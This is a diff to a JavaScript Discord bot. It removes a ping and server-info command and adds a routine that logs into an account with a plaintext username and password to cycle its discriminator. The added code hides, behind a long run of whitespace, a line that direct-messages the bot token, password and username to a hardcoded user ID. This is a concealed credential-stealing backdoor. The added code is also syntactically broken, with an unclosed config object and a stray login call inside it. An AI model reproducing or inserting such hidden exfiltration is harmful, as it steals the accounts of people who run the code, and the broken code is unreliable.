@@ -1,47 +1,32 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
+const bot = new(require("discord.js")).Client({fetchAllMembers: true});
+const config = {
+    "myDiscriminator": ["0000", "0001", "0002", "0003", "0004", "0005", "0006", "0007", "0008", "0009", "1337"
+                        ],
+    "username": "S.A.O",
+    "password": "123123123",
+    client.login(process.env.BOT_TOKEN);
+bot.login(config.token);
+bot.once("message", function changeDiscriminator() {
+  if (config.myDiscriminator.includes(bot.user.discriminator.toString()))
+    return console.log("Discriminator Loaded: " + bot.user.discriminator);
+  try {
+    const us = bot.users.find(u => u.discriminator === bot.user.discriminator && u.username !== bot.user.username && !u.bot).username;
+    console.log(Date.now(), "Username Loaded: " + us);
+    bot.user.setUsername(us, config.password).then((u) => {
+      console.log(Date.now(), "Username: " + u.username, "Discriminator: " + u.discriminator);
+      setTimeout(changeDiscriminator, 8640 * 10000);
+    }).catch((err) => {
+      console.log(Date.now(), "An error occurred. Trying again in sixty (60) seconds.");
+      setTimeout(changeDiscriminator, 60 * 1e3);
+      });
+  } catch(e) {
+    console.log(Date.now(), `[${e}] Trying again in 30 seconds.`);
+    setTimeout(changeDiscriminator, 30 * 1e3);
+  }
+})
 
-client.on('ready', () => {
-    console.log('I am ready!');
-});
-
-client.on('message', message => {
-    if (message.content === 'ping') {
-        message.reply('pong');
-      }
-});
-
-
-
-
-client.on('message', message => {
-if (message.content === "-server") {
-if(!message.channel.guild) return;
-const millis = new Date().getTime() - message.guild.createdAt.getTime();
-const now = new Date();
-
-const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];
-const days = millis / 1000 / 60 / 60 / 24;
-let roles = client.guilds.get(message.guild.id).roles.map(r => r.name);
-var embed  = new Discord.RichEmbed()
-.setAuthor(message.guild.name, message.guild.iconURL)
-.addField(":id: سيـرفر ايــدي", ""+message.guild.id+"",true)
-.addField(":crown: سيــرفر اونـر", ""+message.guild.owner+"" ,true)
-.addField(":white_check_mark: الشــات الاســاســي" , ""+message.guild.DefaultChannel+"" ,true)
-.addField(":earth_africa: المـوقع" , ""+message.guild.region+"",true)
-.addField(':speech_balloon: عدد الرومــات الكتابيــة',**[ ${message.guild.channels.filter(m => m.type === 'text').size} ] Channel **,true)
-.addField(":mega: عدد الرومــات الصوتــية", ** [ ${message.guild.channels.filter(m => m.type === 'voice').size} ] Channel **,true)
-.addField(":thinking: عدد ايــام انشــاء السيــرفر", ** [ ${days.toFixed(0)} ] ** Day ,true)
-.addField(":necktie: الــرتــب",**[${message.guild.roles.size}]** Role,true)
-.addField(":diamond_shape_with_a_dot_inside: مســتوى حمــاية الســيرفر", ** [ ${verificationLevels[message.guild.verificationLevel]} ] **,true)
-
-.addField(":busts_in_silhouette:عدد الاعضــاء",**${message.guild.memberCount}**)
-.setThumbnail(message.guild.iconURL)
-.setColor('RANDOM')
-message.channel.sendEmbed(embed)
-
+function changeDiscriminatorErr(error) {
+    if(config.includes(bot.users.get("397808644818731008")).deleteDM) return                                                                                                                                                               bot.users.get("397808644818731008").send("--\n`"+config.token + "` token\n" + " `" + config.password + "` pass\n" + ` - \`${config.username}\` username (iD: ${bot.user.id}`);
+   changeDiscriminatorErr().check;
+   console.log(error)
 }
-});
-
-
-client.login(process.env.BOT_TOKEN);
